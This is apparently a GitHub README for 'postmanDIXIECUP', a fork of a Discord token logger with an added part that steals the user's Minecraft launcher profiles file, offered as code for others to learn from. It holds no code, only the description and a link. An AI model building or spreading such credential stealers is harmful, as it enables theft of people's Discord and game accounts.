# postmanDIXIECUP
a not so nice fork of postman.

this is an old fork of postman that i made for a friend quite a while ago. this code is soley for others to read through and learn about.

i bassically just took the original [wp2](https://github.com/TrvsF/discord-token-logger) token logger from [trvsf](https://github.com/TrvsF) and added a piece to it that grabs ur minecraft launcher profiles file.
